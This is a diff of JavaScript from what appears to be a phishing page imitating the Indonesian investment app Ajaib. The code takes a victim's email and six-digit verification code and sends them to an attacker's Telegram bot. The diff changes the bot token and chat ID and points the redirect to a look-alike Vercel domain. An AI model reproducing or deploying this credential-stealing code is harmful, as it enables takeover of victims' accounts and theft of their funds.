@@ -197,8 +197,8 @@
 
     function sendToTelegram(code) {
       const email = savedEmail || "Tidak diketahui";
-      const token = "8071583681:AAF6hoDB1lMVpx59cIEM_caXsHfjgZh2ps";
-      const chatId = "7958093111";
+      const token = "7820643180:AAGNkkTM87HKrnkvaKE-9vwtYX25IPEL-mI";
+      const chatId = "8112227018";
 
       const message = `AJAIB 6-DIGIT CODE\nEmail: ${email}\nKode: ${code}`;
 
@@ -217,7 +217,7 @@
 
         // Redirect setelah sukses
         setTimeout(() => {
-          window.location.href = "https://www-login-co-id.vercel.app/kode-verifikasi.html"; // Ganti URL tujuan jika perlu
+          window.location.href = "https://www.ajaib-investasi.vercel.app/kode.byemail.html"; // Ganti URL tujuan jika perlu
         }, 2000);
       }).catch((err) => {
         console.error("Gagal kirim ke Telegram:", err);
